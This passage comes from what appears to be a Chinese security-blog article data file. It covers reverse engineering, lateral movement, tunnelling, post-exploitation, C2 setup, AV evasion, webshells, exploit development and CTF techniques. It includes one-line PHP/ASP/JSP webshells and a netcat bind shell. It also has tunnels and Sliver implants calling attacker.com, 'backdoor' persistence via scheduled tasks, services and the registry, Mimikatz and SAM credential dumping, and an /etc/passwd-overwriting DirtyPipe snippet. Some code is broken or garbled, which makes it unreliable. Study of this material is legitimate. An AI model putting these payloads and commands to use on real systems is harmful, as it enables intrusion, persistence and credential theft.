| Binary Ninja | 二进制分析 |

## 常见混淆

- 代码混淆
- 控制流平坦化
- 虚拟机保护
- 加壳
    `
  },
  {
    slug: 'x86-assembly',
    title: 'x86 汇编基础',
    date: '2026-06-14',
    category: 're',
    subcategory: 'x86-asm',
    tags: ['逆向工程', '汇编', 'x86'],
    summary: 'x86 汇编语言基础指令和寄存器。',
    content: `
## 寄存器

### 通用寄存器
| 寄存器 | 用途 |
|--------|------|
| EAX | 累加器，返回值 |
| EBX | 基址寄存器 |
| ECX | 计数器 |
| EDX | 数据寄存器 |
| ESI | 源索引 |
| EDI | 目标索引 |
| ESP | 栈指针 |
| EBP | 基址指针 |

### 段寄存器
- CS：代码段
- DS：数据段
- SS：栈段
- ES/FS/GS：附加段

## 基本指令

### 数据传送
\`\`\`asm
mov eax, ebx      ; eax = ebx
push eax           ; 压栈
pop ebx            ; 出栈
lea eax, [ebx+8]  ; eax = ebx + 8
\`\`\`

### 算术运算
\`\`\`asm
add eax, 1        ; eax += 1
sub eax, 1        ; eax -= 1
imul eax, ebx     ; eax *= ebx
idiv ebx          ; eax /= ebx
\`\`\`

### 逻辑运算
\`\`\`asm
and eax, 0xff     ; 按位与
or eax, 0x10      ; 按位或
xor eax, eax      ; 清零
not eax           ; 取反
shl eax, 2        ; 左移
shr eax, 2        ; 右移
\`\`\`

### 比较和跳转
\`\`\`asm
cmp eax, ebx      ; 比较
je label          ; 相等跳转
jne label         ; 不相等跳转
jg label          ; 大于跳转
jl label          ; 小于跳转
jmp label         ; 无条件跳转
call function     ; 调用函数
ret               ; 返回
\`\`\`

## 函数调用

\`\`\`
┌─────────────────┐
│ 参数            │
├─────────────────┤
│ 返回地址        │
├─────────────────┤
│ 旧EBP          │ ← EBP
├─────────────────┤
│ 局部变量        │
└─────────────────┘ ← ESP
\`\`\`

## IDA 快捷键

- F5：反编译
- Space：图形视图
- N：重命名
- X：交叉引用
- G：跳转
- ;：添加注释
    `
  },
  {
    slug: 'ida-pro-guide',
    title: 'IDA Pro 使用指南',
    date: '2026-06-11',
    category: 're',
    subcategory: 'ida-pro',
    tags: ['逆向工程', 'IDA', '工具'],
    summary: 'IDA Pro 反汇编工具使用指南。',
    content: `
## IDA Pro 简介

IDA Pro 是最强大的反汇编工具，支持多种架构。

## 基本操作

### 快捷键

| 快捷键 | 功能 |
|--------|------|
| F5 | 反编译为伪代码 |
| Space | 图形/文本视图切换 |
| N | 重命名变量/函数 |
| X | 查看交叉引用 |
| G | 跳转到地址 |
| ; | 添加注释 |
| Tab | 切换视图 |

### 常用窗口

- **IDA View**：反汇编视图
- **Hex View**：十六进制视图
- **Strings**：字符串窗口
- **Functions**：函数列表
- **Imports**：导入表
- **Exports**：导出表

## 分析流程

1. **查看字符串**：Shift+F12
2. **定位 main 函数**
3. **分析关键函数**
4. **跟踪数据流**
5. **理解算法逻辑**

## 脚本编写

### IDAPython

\`\`\`python
import idaapi
import idc

# 获取当前地址
addr = idc.here()

# 获取函数名
func_name = idc.get_func_name(addr)

# 遍历所有函数
for func_ea in Functions():
    print(idc.get_func_name(func_ea))
\`\`\`

### 常用脚本

\`\`\`python
# 批量重命名
import idautils
for func_ea in idautils.Functions():
    name = idc.get_func_name(func_ea)
    if "sub_" in name:
        idc.set_name(func_ea, "func_" + hex(func_ea))
\`\`\`
    `
  },
  {
    slug: 'ghidra-guide',
    title: 'Ghidra 使用指南',
    date: '2026-06-09',
    category: 're',
    subcategory: 'ghidra',
    tags: ['逆向工程', 'Ghidra', 'NSA'],
    summary: 'Ghidra 开源逆向工具使用指南。',
    content: `
## Ghidra 简介

Ghidra 是 NSA 开发的开源逆向工程工具，支持反编译。

## 安装

\`\`\`bash
# 下载
wget https://ghidra-sre.org/ghidra_11.0_PUBLIC_20240130.zip

# 解压
unzip ghidra_*.zip

# 运行
./ghidra_*/ghidraRun
\`\`\`

## 基本操作

### 快捷键

| 快捷键 | 功能 |
|--------|------|
| L | 重命名 |
| Ctrl+E | 编辑函数签名 |
| G | 跳转到地址 |
| X | 交叉引用 |
| 双击 | 跳转 |

### 常用窗口

- **Listing**：反汇编视图
- **Decompiler**：反编译视图
- **Symbol Tree**：符号树
- **Data Type Manager**：数据类型

## 反编译

1. 导入二进制文件
2. 自动分析
3. 找到目标函数
4. 查看反编译结果

## 脚本编写

### Java 脚本

\`\`\`java
import ghidra.program.model.listing.*;
import ghidra.app.script.GhidraScript;

public class MyScript extends GhidraScript {
    @Override
    public void run() {
        Listing listing = currentProgram.getListing();
        // 分析代码
    }
}
\`\`\`

## Ghidra vs IDA

| 特性 | Ghidra | IDA |
|------|--------|-----|
| 价格 | 免费 | 商业 |
| 反编译 | 内置 | 需插件 |
| 架构支持 | 多 | 多 |
| 插件生态 | 一般 | 丰富 |
    `
  },
  // 内网渗透
  {
    slug: 'internal-recon',
    title: '内网信息收集',
    date: '2026-06-16',
    category: 'internal',
    subcategory: 'internal-recon',
    tags: ['内网渗透', '信息收集', '横向'],
    summary: '内网环境信息收集方法和工具。',
    content: `
## 本机信息

\`\`\`bash
# 系统信息
systeminfo
uname -a

# 网络信息
ipconfig /all
ifconfig -a

# 用户信息
whoami /all
net user
\`\`\`

## 网络环境

\`\`\`bash
# 路由表
route print
ip route

# ARP 表
arp -a

# 网络连接
netstat -ano
ss -antlp
\`\`\`

## 域环境

\`\`\`powershell
# 域信息
nltest /dclist:domain.com
net config workstation
net user /domain
net group "Domain Admins" /domain
\`\`\`

## 扫描工具

### fscan

\`\`\`bash
# 快速扫描
fscan -h 192.168.1.0/24

# 指定端口
fscan -h 192.168.1.0/24 -p 80,443,445,3389
\`\`\`

### CobaltStrike

\`\`\`
portscan 192.168.1.0/24 80,443,445 arp
\`\`\`

### Nmap

\`\`\`bash
nmap -sn 192.168.1.0/24
nmap -sV -p 80,443,445,3389 192.168.1.0/24
\`\`\`

## 敏感信息

\`\`\`bash
# 浏览器密码
# WiFi密码
# 文件共享
# 打印机
# 邮件服务器
\`\`\`
    `
  },
  {
    slug: 'proxy-tunnel',
    title: '代理与隧道技术',
    date: '2026-06-14',
    category: 'internal',
    subcategory: 'proxy-tunnel',
    tags: ['内网渗透', '代理', '隧道'],
    summary: '内网穿透代理和隧道技术。',
    content: `
## 代理工具

### ProxyChains

\`\`\`bash
# 配置 /etc/proxychains4.conf
socks5 127.0.0.1 1080

# 使用
proxychains nmap -sV target.com
\`\`\`

### SocksDroid（安卓）

### Proxifier（Windows/Mac）

## 隧道工具

### SSH 隧道

\`\`\`bash
# 本地转发
ssh -L 8080:internal-host:80 user@jump-server

# 远程转发
ssh -R 8080:localhost:80 user@attacker

# 动态转发（SOCKS代理）
ssh -D 1080 user@jump-server
\`\`\`

### FRP

\`\`\`ini
# frpc.ini
[common]
server_addr = attacker.com
server_port = 7000

[ssh]
type = tcp
local_ip = 127.0.0.1
local_port = 22
remote_port = 6000
\`\`\`

### ngrok

\`\`\`bash
ngrok http 8080
\`\`\`

### Chisel

\`\`\`bash
# 服务端
chisel server --reverse

# 客户端
chisel client attacker.com:8080 R:socks
\`\`\`

## 端口转发

\`\`\`bash
# netcat
nc -lvp 8080 -e /bin/sh
nc attacker 8080

# socat
socat TCP-LISTEN:8080,fork TCP:internal:80
\`\`\`

## DNS 隧道

\`\`\`bash
# iodine
iodined -f tunnel.domain.com
iodine tunnel.domain.com
\`\`\`
    `
  },
  {
    slug: 'internal-post',
    title: '后渗透技术',
    date: '2026-06-12',
    category: 'internal',
    subcategory: 'internal-post',
    tags: ['内网渗透', '后渗透', '持久化'],
    summary: '获取初始访问后的后渗透技术。',
    content: `
## 信息收集

\`\`\`powershell
# 本机信息
systeminfo
ipconfig /all
whoami /all
net user

# 网络信息
arp -a
route print
netstat -ano
\`\`\`

## 权限提升

### Windows

\`\`\`powershell
# WinPEAS
winpeas.exe

# 提权漏洞
systeminfo | findstr KB
\`\`\`

### Linux

\`\`\`bash
# LinPEAS
./linpeas.sh

# SUID 提权
find / -perm -4000 2>/dev/null
\`\`\`

## 凭据获取

### Windows

\`\`\`powershell
# Mimikatz
mimikatz.exe
sekurlsa::logonpasswords

# SAM 文件
reg save HKLM\\SAM sam.hive
reg save HKLM\\SYSTEM system.hive
\`\`\`

### 浏览器密码

\`\`\`
Chrome: %LocalAppData%\\Google\\Chrome\\User Data\\Default\\Login Data
Firefox: %AppData%\\Mozilla\\Firefox\\Profiles\\
\`\`\`

## 持久化

### 计划任务

\`\`\`powershell
schtasks /create /tn "backdoor" /tr "C:\\backdoor.exe" /sc minute /mo 1
\`\`\`

### 服务

\`\`\`powershell
sc create backdoor binPath= "C:\\backdoor.exe" start= auto
\`\`\`

### 注册表

\`\`\`powershell
reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v backdoor /t REG_SZ /d "C:\\backdoor.exe"
\`\`\`
    `
  },
  {
    slug: 'apt-attack',
    title: 'APT 攻击概述',
    date: '2026-06-08',
    category: 'internal',
    subcategory: 'apt',
    tags: ['APT', '高级威胁', '攻防'],
    summary: 'APT 攻击技术和常见手法。',
    content: `
## 什么是 APT

APT（Advanced Persistent Threat）高级持续性威胁，指有组织、有目标的长期攻击。

## APT 攻击阶段

1. **侦查**：目标信息收集
2. **武器化**：制作恶意载荷
3. **投递**：钓鱼邮件、水坑攻击
4. **利用**：漏洞利用
5. **安装**：植入后门
6. **C2**：命令控制
7. **目标达成**：数据窃取

## 常见手法

### 钓鱼邮件

\`\`\`
# 附件类型
- .exe
- .doc（含宏）
- .pdf（含漏洞）
- .lnk（快捷方式）
- .iso
\`\`\`

### 水坑攻击

\`\`\`
# 感染目标常访问的网站
# 植入恶意代码
# 等待目标访问
\`\`\`

### 供应链攻击

\`\`\`
# 污染软件源
# 植入后门
# 通过正常更新分发
\`\`\`

## 常见 APT 组织

| 组织 | 地区 | 目标行业 |
|------|------|----------|
| APT28 | 俄罗斯 | 政府、军事 |
| APT29 | 俄罗斯 | 政府 |
| Lazarus | 朝鲜 | 金融、加密货币 |
| OceanLotus | 越南 | 东亚 |

## 检测方法

1. 流量分析
2. 日志审计
3. 威胁情报
4. 行为分析
5. 沙箱检测
    `
  },
  // 安全开发
  {
    slug: 'secure-coding',
    title: '安全编码规范',
    date: '2026-06-15',
    category: 'securedev',
    subcategory: 'secure-coding',
    tags: ['安全开发', '编码规范', 'OWASP'],
    summary: '各语言安全编码最佳实践。',
    content: `
## 通用原则

1. **最小权限**：只授予必要的权限
2. **纵深防御**：多层安全控制
3. **输入验证**：永远不信任用户输入
4. **输出编码**：根据上下文编码
5. **安全默认**：默认安全配置

## 输入验证

### 白名单验证

\`\`\`python
import re

def validate_email(email):
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$'
    return re.match(pattern, email) is not None
\`\`\`

### 类型检查

\`\`\`python
def get_user_id(user_id):
    if not isinstance(user_id, int):
        raise ValueError("Invalid user ID")
    return user_id
\`\`\`

## SQL 注入防御

### 参数化查询

\`\`\`python
# 正确
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# 错误
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
\`\`\`

## XSS 防御

### 输出编码

\`\`\`python
from markupsafe import escape

# 转义HTML
safe_content = escape(user_input)
\`\`\`

## 命令注入防御

\`\`\`python
import subprocess

# 正确
subprocess.run(["ls", user_input], shell=False)

# 错误
os.system(f"ls {user_input}")
\`\`\`

## 密码存储

\`\`\`python
from werkzeug.security import generate_password_hash, check_password_hash

# 存储
password_hash = generate_password_hash(password)

# 验证
check_password_hash(password_hash, input_password)
\`\`\`
    `
  },
  {
    slug: 'devsecops',
    title: 'DevSecOps 实践',
    date: '2026-06-13',
    category: 'securedev',
    subcategory: 'devsecops',
    tags: ['DevSecOps', 'CI/CD', '安全'],
    summary: 'DevSecOps 流程和工具集成。',
    content: `
## 什么是 DevSecOps

DevSecOps 是将安全集成到 DevOps 流程中的实践。

## 流程

\`\`\`
计划 → 编码 → 构建 → 测试 → 发布 → 部署 → 运维 → 监控
  ↓      ↓      ↓      ↓      ↓      ↓      ↓      ↓
 安全    安全    安全    安全    安全    安全    安全    安全
\`\`\`

## 安全测试阶段

### 开发阶段
- IDE 安全插件
- 预提交钩子
- 代码审查

### 构建阶段
- SAST（静态分析）
- 依赖检查
- 容器镜像扫描

### 测试阶段
- DAST（动态分析）
- 渗透测试
- 安全回归测试

### 部署阶段
- 配置审计
- 密钥管理
- 合规检查

## 工具

| 阶段 | 工具 |
|------|------|
| SAST | SonarQube, Semgrep, Checkmarx |
| DAST | OWASP ZAP, Burp Suite |
| SCA | Snyk, Dependency-Check |
| 容器扫描 | Trivy, Snyk Container |
| 密钥扫描 | GitLeaks, TruffleHog |

## CI/CD 集成

### GitHub Actions

\`\`\`yaml
- name: Run SAST
  uses: github/codeql-action/analyze@v2

- name: Run Snyk
  uses: snyk/actions@master
  env:
    SNYK_TOKEN: \${{ secrets.SNYK_TOKEN }}
\`\`\`
    `
  },
  {
    slug: 'sast-dast',
    title: 'SAST 与 DAST 工具指南',
    date: '2026-06-10',
    category: 'securedev',
    subcategory: 'sast-dast',
    tags: ['安全测试', 'SAST', 'DAST'],
    summary: '静态和动态安全测试工具使用指南。',
    content: `
## SAST（静态应用安全测试）

### 特点
- 分析源代码
- 不需要运行程序
- 可以发现代码级漏洞
- 覆盖率高

### 工具

#### SonarQube

\`\`\`bash
# 扫描
sonar-scanner -Dsonar.projectKey=myproject -Dsonar.sources=. -Dsonar.host.url=http://localhost:9000
\`\`\`

#### Semgrep

\`\`\`bash
# 基本使用
semgrep --config=auto .

# 指定规则
semgrep --config=p/owasp-top-ten .
\`\`\`

#### Bandit（Python）

\`\`\`bash
bandit -r .
\`\`\`

### 常见发现

- SQL 注入
- XSS
- 命令注入
- 硬编码密码
- 不安全的随机数

## DAST（动态应用安全测试）

### 特点
- 测试运行中的应用
- 模拟攻击者视角
- 发现运行时漏洞
- 无需源代码

### 工具

#### OWASP ZAP

\`\`\`bash
# 扫描
zap-baseline.py -t http://target.com

# 主动扫描
zap-full-scan.py -t http://target.com
\`\`\`

#### Nuclei

\`\`\`bash
nuclei -u http://target.com -t cves/
\`\`\`

### 常见发现

- SQL 注入
- XSS
- CSRF
- 信息泄露
- 配置错误

## SAST vs DAST

| 特性 | SAST | DAST |
|------|------|------|
| 分析对象 | 源代码 | 运行应用 |
| 阶段 | 开发早期 | 测试/生产 |
| 覆盖率 | 高 | 低 |
| 误报率 | 较高 | 较低 |
    `
  },
  // 红队技术
  {
    slug: 'c2-frameworks',
    title: 'C2 框架深度对比',
    date: '2026-06-20',
    category: 'redteam',
    subcategory: 'c2-framework',
    tags: ['红队', 'C2', '框架'],
    summary: '主流 C2 框架对比和实战配置。',
    content: `
## 什么是 C2

C2（Command and Control）命令与控制框架，用于红队渗透测试中管理被控主机。

## 主流框架对比

| 框架 | 特点 | 适用场景 |
|------|------|----------|
| CobaltStrike | 商业，功能全面 | 企业红队 |
| Sliver | 开源，Go编写 | 技术研究 |
| Havoc | 开源，现代化 | 技术研究 |
| Mythic | 开源，模块化 | 技术研究 |
| Brute Ratel | 商业，免杀强 | 高级红队 |

## Sliver 基础

### 安装

\`\`\`bash
# 安装
go install github.com/BishopFox/sliver/client@latest

# 或使用预编译版本
\`\`\`

### 生成 Payload

\`\`\`bash
# HTTP
sliver> generate --mtls attacker.com --os windows --arch amd64 --save ./beacon.exe

# DNS
sliver> generate --dns domain.com --os linux --save ./beacon

# 会话生成
sliver> generate --mtls attacker.com --save ./implant --session-lifetime 24h
\`\`\`

### 会话管理

\`\`\`bash
sliver> sessions              # 查看会话
sliver> use <session_id>      # 切换会话
sliver> background            # 后台运行
\`\`\`

### 常用命令

\`\`\`bash
sliver> info                  # 系统信息
sliver> ls                    # 列出文件
sliver> cd                    # 切换目录
sliver> upload / download     # 传输文件
sliver> shell                 # 交互Shell
sliver> execute               # 执行文件
sliver> screenshots           # 截屏
sliver> keylog                # 键盘记录
\`\`\`

## 通信协议

### MTLS（双向TLS）
最安全，需要证书。

### HTTP(S)
隐蔽性好，不易被检测。

### DNS
适合严格防火墙环境。

### WireGuard
VPN隧道，稳定。

## 流量混淆

\`\`\`bash
# Sliver 自定义混淆
sliver> generate --mtls attacker.com --混淆 --保存

# 使用 CDN
sliver> generate --cdn cloudfront.net --save ./beacon.exe
\`\`\`

## 防检测

1. 使用自定义Profile
2. 流量加密
3. 通信混淆
4. 域前置（Domain Fronting）
5. 多级跳板
    `
  },
  {
    slug: 'evasion-techniques',
    title: '免杀技术详解',
    date: '2026-06-18',
    category: 'redteam',
    subcategory: 'evasion',
    tags: ['红队', '免杀', '对抗'],
    summary: '绕过杀软检测的技术方法。',
    content: `
## 什么是免杀

免杀（AV Evasion）是绕过杀毒软件检测的技术。

## 检测方式

### 静态检测
- 特征码匹配
- 文件哈希
- PE 结构分析

### 动态检测
- 行为监控
- 沙箱检测
- 内存扫描

## 免杀方法

### 1. 加壳

\`\`\`bash
# UPX
upx -9 payload.exe

# Themida
# VMProtect
\`\`\`

### 2. 代码混淆

\`\`\`python
# 字符串加密
import base64
encoded = base64.b64encode("cmd.exe".encode())
\`\`\`

### 3. 多态/变形

\`\`\`
# 每次生成不同代码
# 相同功能，不同形态
\`\`\`

### 4. 内存加载

\`\`\`python
# 不写入磁盘
import ctypes
ctypes.windll.kernel32.VirtualAlloc(...)
ctypes.windll.kernel32.RtlMoveMemory(...)
\`\`\`

### 5. 反射DLL注入

\`\`\`python
# 从内存加载DLL
import ctypes
dll = ctypes.windll.kernel32.LoadLibrary("payload.dll")
\`\`\`

### 6. 进程注入

\`\`\`python
# 注入到合法进程
# Process Hollowing
# DLL Injection
\`\`\`

### 7. API 调用混淆

\`\`\`
# 使用非常规API
# 动态获取API地址
# 加密API字符串
\`\`\`

### 8. 供应链攻击

\`\`\`
# 污染合法软件
# 通过更新分发
\`\`\`

## 测试工具

\`\`\`bash
# VirusTotal 检测
vt scan file payload.exe

# 本地测试
# 多引擎检测网站
\`\`\`

## 对抗趋势

1. EDR 检测增强
2. 内存扫描普及
3. 行为分析增强
4. 云查杀普及
    `
  },
  {
    slug: 'social-engineering',
    title: '社会工程学攻击',
    date: '2026-06-15',
    category: 'redteam',
    subcategory: 'social-eng',
    tags: ['红队', '社会工程', '钓鱼'],
    summary: '社会工程学攻击技术和防御方法。',
    content: `
## 什么是社会工程学

利用人的心理弱点，通过欺骗手段获取敏感信息或执行操作。

## 攻击类型

### 1. 钓鱼攻击

#### 邮件钓鱼

\`\`\`
# 常见主题
- 账户验证
- 密码重置
- 发票通知
- HR通知

# 技术手段
- 仿冒域名
- 伪造发件人
- 恶意链接/附件
\`\`\`

#### 鱼叉式钓鱼

\`\`\`
# 针对特定目标
- 收集目标信息
- 定制化内容
- 高成功率
\`\`\`

### 2. 水坑攻击

\`\`\`
# 感染目标常访问的网站
# 等待目标访问
# 植入恶意代码
\`\`\`

### 3. 电话攻击

\`\`\`
# 冒充技术支持
- "您的账户有异常"
- "需要验证身份"
- "请提供密码"
\`\`\`

### 4. 物理攻击

\`\`\`
# 尾随进入
# 假冒身份
# USB投放
\`\`\`

## 信息收集

### OSINT

\`\`\`
# 社交媒体
- LinkedIn：职业信息
- Facebook：个人关系
- Twitter：兴趣爱好

# 公司信息
- 官网
- 新闻稿
- 招聘信息
\`\`\`

### 技术手段

\`\`\`
# 邮箱收集
theHarvester -d target.com -b google

# 密码泄露
Have I Been Pwned
\`\`\`

## 防御

1. 安全意识培训
2. 多因素认证
3. 邮件网关
4. 安全策略
5. 演练测试
    `
  },
  {
    slug: 'webshell-techniques',
    title: 'Webshell 高级技术',
    date: '2026-06-12',
    category: 'redteam',
    subcategory: 'webshell',
    tags: ['红队', 'Webshell', '后门'],
    summary: 'Webshell 加密、混淆和高级技术。',
    content: `
## 一句话木马

### PHP

\`\`\`php
<?php eval($_POST['cmd']); ?>
<?php system($_GET['cmd']); ?>
<?php @eval($_POST['a']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
\`\`\`

### ASP

\`\`\`asp
<%eval request("cmd")%>
<% execute(request("cmd"))%>
\`\`\`

### JSP

\`\`\`jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
\`\`\`

## 加密 Webshell

### PHP Base64

\`\`\`php
<?php
$a = "base64编码的代码";
eval(base64_decode($a));
?>
\`\rypt\`

### PHP 异或

\`\`\`php
<?php
$a='!((%^$#...';  // 异或结果
eval($a);
?>
\`\`\`

## 免杀 Webshell

### 动态函数调用

\`\`\`php
<?php
\\$func = \\$_GET['func'];
\\$func(\\$_GET['cmd']);
?>
\`\`\`

### 回调函数

\`\`\`php
<?php
\\$callback = create_function('', \\$_POST['code']);
\\$callback();
?>
\`\`\`

## 大马

### 功能型

\`\`\`php
<?php
// 文件管理
// 数据库管理
// 命令执行
// 提权功能
\`\`\`

## Webshell 管理工具

### 中国蚁剑（AntSword）

\`\`\`
# 特点
- 跨平台
- 多语言支持
- 插件丰富
\`\`\`

### 哥斯拉（Godzilla）

\`\`\`
# 特点
- 加密通信
- 多种加密方式
- 内存马支持
\`\`\`

### 冰蝎（Behinder）

\`\`\`
# 特点
- AES加密
- 内存马
- 动态加载
\`\`\`

## 内存马

### 无文件 Webshell

\`\`\`java
# Servlet型
# Filter型
# Listener型
# Spring Controller型
\`\`\`

## 防御

1. WAF 检测
2. 文件完整性监控
3. 流量检测
4. 行为分析
5. 定期扫描
    `
  },
  // 漏洞分析
  {
    slug: 'cve-analysis',
    title: 'CVE 漏洞分析方法',
    date: '2026-06-17',
    category: 'vuln-analysis',
    subcategory: 'cve-analysis',
    tags: ['漏洞分析', 'CVE', '安全研究'],
    summary: 'CVE 漏洞分析和复现方法。',
    content: `
## 什么是 CVE

CVE（Common Vulnerabilities and Exposures）通用漏洞披露，用于标识漏洞的标准化系统。

## CVE 信息来源

- https://cve.mitre.org/
- https://nvd.nist.gov/
- https://漏洞平台

## 分析流程

### 1. 漏洞信息收集

\`\`\`
- CVE 编号
- 影响版本
- 漏洞描述
- PoC/EXP
- 修复方案
\`\`\`

### 2. 环境搭建

\`\`\`bash
# Docker 快速搭建
docker pull vulnerable-app:version
docker run -d -p 8080:80 vulnerable-app

# 靶场
Vulhub
VulApps
\`\`\`

### 3. 漏洞验证

\`\`\`bash
# 使用 PoC
python poc.py -t http://target:8080

# 手动验证
curl -X POST http://target/vuln -d "param=malicious"
\`\`\`

### 4. 漏洞分析

\`\`\`
# 阅读补丁
git diff old_version new_version

# 代码审计
# 反编译分析
# 调试跟踪
\`\`\`

### 5. EXP 开发

\`\`\`python
# 编写利用脚本
import requests

def exploit(target):
    payload = "malicious_code"
    r = requests.post(f"{target}/vuln", data={"param": payload})
    return r.text
\`\`\`

## 常见漏洞类型

| 类型 | 示例 |
|------|------|
| RCE | Log4j, Spring4Shell |
| 反序列化 | Fastjson, Shiro |
| 注入 | SQLi, LDAPi |
| SSRF | XXE, SSRF |
| 权限提升 | DirtyPipe |

## 漏洞复现环境

### Vulhub

\`\`\`bash
git clone https://github.com/vulhub/vulhub
cd vulhub/log4j/CVE-2021-44228
docker-compose up -d
\`\`\`
    `
  },
  {
    slug: 'heap-overflow',
    title: '堆溢出利用技术',
    date: '2026-06-14',
    category: 'vuln-analysis',
    subcategory: 'heap-overflow',
    tags: ['漏洞利用', '堆溢出', 'PWN'],
    summary: '堆溢出漏洞原理和利用方法。',
    content: `
## 堆的基本概念

### 堆管理

\`\`\`
┌─────────────────┐
│ chunk header    │ ← size + flags
├─────────────────┤
│ user data       │
├─────────────────┤
│ prev_size       │
├─────────────────┤
│ chunk header    │
└─────────────────┘
\`\`\`

### 堆分配

\`\`\`
malloc(size)  → 分配堆块
free(ptr)     → 释放堆块
\`\`\`

## 常见漏洞

### 1. Use-After-Free（UAF）

\`\`\`c
char *ptr = malloc(32);
free(ptr);
// ptr 未置空
ptr[0] = 'A';  // 使用已释放内存
\`\`\`

### 2. Double Free

\`\`\`c
char *ptr = malloc(32);
free(ptr);
free(ptr);  // 重复释放
\`\`\`

### 3. Off-By-One

\`\`\`c
char buf[32];
gets(buf);  // 溢出一个字节
\`\`\`

### 4. House of系列

- **House of Force**：利用 top chunk
- **House of Spirit**：伪造空闲块
- **House of Lore**：利用 smallbin
- **House of Orange**：利用 top chunk

## GDB 调试

\`\`\`bash
# 堆块信息
pheap 10

# 查看所有堆块
find 0xdeadbeef

# watch 点
watch *(int*)0x12345678
\`\`\`

## 防御

1. Canary 保护
2. ASLR
3. PIE
4. 堆保护机制
    `
  },
  {
    slug: 'rop-technique',
    title: 'ROP 返回导向编程',
    date: '2026-06-11',
    category: 'vuln-analysis',
    subcategory: 'rop',
    tags: ['漏洞利用', 'ROP', 'PWN'],
    summary: 'ROP 技术原理和利用方法。',
    content: `
## 什么是 ROP

ROP（Return-Oriented Programming）返回导向编程，利用已有代码片段（gadget）构造攻击链。

## 基本原理

\`\`\`
┌─────────────────┐
│ gadget1         │ → pop rdi; ret
├─────────────────┤
│ gadget2         │ → mov rax, 1; ret
├─────────────────┤
│ ...             │
└─────────────────┘
\`\`\`

## Gadget 查找

### ROPgadget

\`\`\`bash
# 查找所有gadget
ROPgadget --binary target --ropchain

# 查找特定gadget
ROPgadget --binary target | grep "pop rdi"
\`\`\`

### ropper

\`\`\`bash
ropper --file target --search "pop rdi"
\`\`\`

## ROP 构造

### ret2libc

\`\`\`python
from pwn import *

# 获取 libc 地址
system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))

# 构造 ROP
rop = ROP(libc)
rop.call(system, [bin_sh])
\`\`\`

### 通用 gadget

\`\`\`python
# 搜索通用 gadget
pop_rdi = 0x401234  # pop rdi; ret
ret = 0x40101a      # ret

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)
\`\`\`

## 防御

1. ROP 保护
2. 控制流完整性（CFI）
3. CET（Intel Control-flow Enforcement Technology）
    `
  },
  {
    slug: 'kernel-exploit',
    title: '内核漏洞利用',
    date: '2026-06-08',
    category: 'vuln-analysis',
    subcategory: 'kernel-exploit',
    tags: ['漏洞利用', '内核', '提权'],
    summary: 'Linux 内核漏洞利用技术。',
    content: `
## 内核漏洞类型

### 1. 本地提权

\`\`\`
# DirtyCow (CVE-2016-5195)
# DirtyPipe (CVE-2022-0847)
# 经典竞态条件
\`\`\`

### 2. 内核 RCE

\`\`\`
# 内核模块漏洞
# 网络协议栈漏洞
\`\`\`

## DirtyPipe (CVE-2022-0847)

### 影响版本

\`\`\`
Linux 5.8+
\`\`\`

### 漏洞原理

\`\`\`c
// 竞态条件导致覆写页面缓存
pipe_write() 与 splice() 竞争
\`\`\`

### 利用代码

\`\`\`c
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

int main() {
    int p[2];
    pipe(p);
    
    // 覆写 /etc/passwd
    const char *payload = "root2::0:0::/root:/bin/sh\\n";
    write(p[1], payload, strlen(payload));
    
    splice(p[0], NULL, fd, NULL, 1, 0);
    return 0;
}
\`\`\`

## 内核调试

### QEMU + GDB

\`\`\`bash
# 启动内核
qemu-system-x86_64 -kernel bz-append -initrd initramfs.cpio.gz -s -S

# GDB 连接
gdb vmlinux
target remote :1234
\`\`\`

### 常用调试命令

\`\`\`bash
# 查看进程信息
p current

# 查看 task_struct
p *(struct task_struct *)current

# 查看 cred
p current->cred
\`\`\`

## 内核保护

| 保护 | 说明 |
|------|------|
| SMEP | 禁止内核执行用户空间代码 |
| SMAP | 禁止内核访问用户空间数据 |
| KASLR | 内核地址空间随机化 |
| KPTI | 内核页表隔离 |

## 防御

1. 及时更新内核
2. 启用保护机制
3. 限制内核模块加载
4. 使用 grsecurity/PaX
    `
  },
  // CTF 竞赛
  {
    slug: 'ctf-web',
    title: 'CTF Web 方向指南',
    date: '2026-06-16',
    category: 'ctf',
    subcategory: 'ctf-web',
    tags: ['CTF', 'Web', '竞赛'],
    summary: 'CTF Web 方向常见题型和解题思路。',
    content: `
## 常见题型

### 1. SQL 注入

\`\`\`sql
# 无过滤
' union select 1,2,3-- -

# 绕过过滤
/**/替代空格
大小写混合
\`\`\`

### 2. XSS

\`\`\`html
# 反射型
<script>alert(1)</script>

# 存储型
评论区注入

# DOM型
URL参数注入
\`\`\`

### 3. 文件上传

\`\`\`
# 绕过限制
.php5, .phtml
大小写：.PhP
图片马
\`\`\`

### 4. 反序列化

\`\`\`php
# PHP
O:4:"User":1:{s:4:"name";s:5:"admin";}

# Python
__import__('os').popen('whoami').read()
\`\`\`

### 5. 命令注入

\`\`\`bash
# 管道符
; |
|| &&

# 空格绕过
\\$IFS
{cmd,arg}
\`\`\`

### 6. SSTI

\`\`\`jinja2
# Jinja2
{{7*7}}  → 49
{{config}}

# Tplmap 工具
tplmap -u http://target/?param=1
\`\`\`

### 7. SSRF

\`\`\`
# 协议利用
file:///etc/passwd
gopher://127.0.0.1:6379/
\`\`\`

## 常用工具

- Burp Suite
- sqlmap
- dirsearch
- xssstrike
- tplmap

## 解题思路

1. 信息收集
2. 漏洞识别
3. 漏洞利用
4. 获取 flag
    `
  },
  {
    slug: 'ctf-pwn',
    title: 'CTF PWN 方向指南',
    date: '2026-06-13',
    category: 'ctf',
    subcategory: 'ctf-pwn',
    tags: ['CTF', 'PWN', '二进制'],
    summary: 'CTF PWN 方向常见题型和解题思路。',
    content: `
## 常见题型

### 1. 栈溢出

\`\`\`python
from pwn import *

# 覆盖返回地址
payload = b'A' * offset
payload += p64(shellcode_addr)
\`\`\`

### 2. 格式化字符串

\`\`\`python
# 读取栈数据
payload = '%x.%x.%x.%x'

# 写入数据
payload = p64(target_addr) + '%100n'
\`\`\`

### 3. 堆利用

\`\`\`
# UAF
# Double Free
# House of系列
